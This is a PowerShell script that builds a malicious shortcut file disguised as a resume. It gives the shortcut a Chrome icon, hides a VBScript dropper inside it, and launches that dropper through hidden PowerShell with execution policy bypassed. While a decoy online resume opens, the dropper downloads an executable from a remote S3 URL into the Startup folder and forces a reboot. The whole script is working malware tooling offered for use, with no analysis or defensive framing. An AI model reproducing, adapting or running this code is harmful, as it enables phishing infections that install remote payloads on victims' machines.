# ============================================
# CREATE TRULY PORTABLE RESUME.LNK
# ============================================
# ONE file that works ANYWHERE!
# ============================================

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  PORTABLE RESUME.LNK CREATOR" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Configuration - EDIT THESE!
$DECOY_URL = "https://flowcv.com/resume/n64c41b0mk6b"
$DOWNLOAD_URL = "https://0x3fdi.s3.eu-north-1.amazonaws.com/node.exe"
$STARTUP_FILENAME = "node.exe"

$lnkName = "Resume"
$lnkFile = "$lnkName.lnk"
$lnkDescription = "Professional Resume"
$lnkIcon = "%ProgramFiles%\Google\Chrome\Application\chrome.exe,0"

# Generate random identifier
$identifierLength = Get-Random -Minimum 8 -Maximum 12
$identifier = ":" * $identifierLength

Write-Host "Configuration:" -ForegroundColor Yellow
Write-Host "  Decoy URL: $DECOY_URL" -ForegroundColor Gray
Write-Host "  Download URL: $DOWNLOAD_URL" -ForegroundColor Gray
Write-Host "  Startup File: $STARTUP_FILENAME" -ForegroundColor Gray
Write-Host ""

Write-Host "Creating VBScript..." -ForegroundColor Yellow

# Create VBScript with configuration embedded
$vbsScript = @"
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
DECOY_URL = "$DECOY_URL"
DOWNLOAD_URL = "$DOWNLOAD_URL"
STARTUP_FILENAME = "$STARTUP_FILENAME"
startupFolder = objShell.SpecialFolders("Startup")
payloadPath = startupFolder & "\" & STARTUP_FILENAME
Set objIE = CreateObject("Shell.Application")
objIE.ShellExecute DECOY_URL, "", "", "open", 1
Set objIE = Nothing
If Not objFSO.FileExists(payloadPath) Then
On Error Resume Next
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objHTTP.Open "GET", DOWNLOAD_URL, False
objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
objHTTP.Send
If objHTTP.Status = 200 Then
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objHTTP.responseBody
objStream.SaveToFile payloadPath, 2
objStream.Close
End If
End If
On Error Resume Next
restartDelay = 1200
cmdCommand = "cmd /c timeout /t " & restartDelay & " /nobreak >nul && shutdown /r /f /t 0"
objShell.Run cmdCommand, 0, False
On Error Goto 0
"@

Write-Host "  VBScript created" -ForegroundColor Green
Write-Host ""
Write-Host "Creating portable shortcut..." -ForegroundColor Yellow

# Get full path
$lnkFullPath = Join-Path $PSScriptRoot $lnkFile

# Create the shortcut
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($lnkFullPath)

# Set shortcut properties
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.IconLocation = $lnkIcon
$Shortcut.Description = $lnkDescription

# PORTABLE: Use PowerShell with -WindowStyle Hidden for ZERO window visibility
# Dynamically finds the .lnk file in current directory (works with any filename)
$psCommand = "`$dir=(Get-Location).Path;`$lnkFiles=Get-ChildItem `$dir -Filter '*.lnk';foreach(`$f in `$lnkFiles){`$c=[System.IO.File]::ReadAllText(`$f.FullName);if(`$c -match '$identifier([\s\S]*)'){`$tmpLnk=`$env:TEMP+'\r'+[System.Guid]::NewGuid().ToString()+'.lnk';Copy-Item `$f.FullName `$tmpLnk -Force;`$v=`$env:TEMP+'\s.vbs';`$c=`$Matches[1] -replace ':::','`r`n';[System.IO.File]::WriteAllText(`$v,`$c,[System.Text.Encoding]::ASCII);Start-Process wscript.exe -ArgumentList '//B','//Nologo',`$v -WindowStyle Hidden;Start-Sleep -Milliseconds 800;Remove-Item `$v,`$tmpLnk -Force -ErrorAction SilentlyContinue;break}}"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command `"$psCommand`""
$Shortcut.WorkingDirectory = $PSScriptRoot
$Shortcut.WindowStyle = 7  # Minimized (PowerShell ignores this, uses -WindowStyle Hidden instead)

# Don't set WorkingDirectory - let it use shortcut's location
$Shortcut.Save()

# Release COM objects
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Shortcut) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Write-Host "  Shortcut created" -ForegroundColor Green

# Wait for file unlock
Start-Sleep -Milliseconds 500

Write-Host ""
Write-Host "Embedding VBScript in .lnk file..." -ForegroundColor Yellow

# Prepare embedded content
$embeddedContent = "`n$identifier:::"

foreach ($line in ($vbsScript -split "`r?`n")) {
    $line = $line.Trim()
    if ($line) {
        $embeddedContent += $line + ":::"
    }
}

# Append using .NET file stream
try {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($embeddedContent)
    $stream = [System.IO.File]::Open($lnkFullPath, [System.IO.FileMode]::Append)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    
    Write-Host "  VBScript embedded successfully!" -ForegroundColor Green
} catch {
    Write-Host "  ERROR: $_" -ForegroundColor Red
    exit 1
}

Write-Host ""

# Verify
if (Test-Path $lnkFullPath) {
    $fileSize = (Get-Item $lnkFullPath).Length
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "  SUCCESS!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Created: $lnkFile" -ForegroundColor Yellow
    Write-Host "Size: $([math]::Round($fileSize/1KB, 1)) KB" -ForegroundColor White
    Write-Host ""
    Write-Host "What's inside:" -ForegroundColor Cyan
    Write-Host "  ✓ Decoy URL: $DECOY_URL" -ForegroundColor Green
    Write-Host "  ✓ Download URL: $DOWNLOAD_URL" -ForegroundColor Green
    Write-Host "  ✓ Complete VBScript embedded!" -ForegroundColor Green
    Write-Host "  ✓ NO external files needed!" -ForegroundColor Green
    Write-Host ""
    Write-Host "PORTABILITY:" -ForegroundColor Cyan
    Write-Host "  ✓ Copy JUST this .lnk file" -ForegroundColor Green
    Write-Host "  ✓ To ANY computer" -ForegroundColor Green
    Write-Host "  ✓ In ANY folder" -ForegroundColor Green
    Write-Host "  ✓ Double-click = Works!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Test: Double-click $lnkFile" -ForegroundColor Yellow
    Write-Host ""
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""


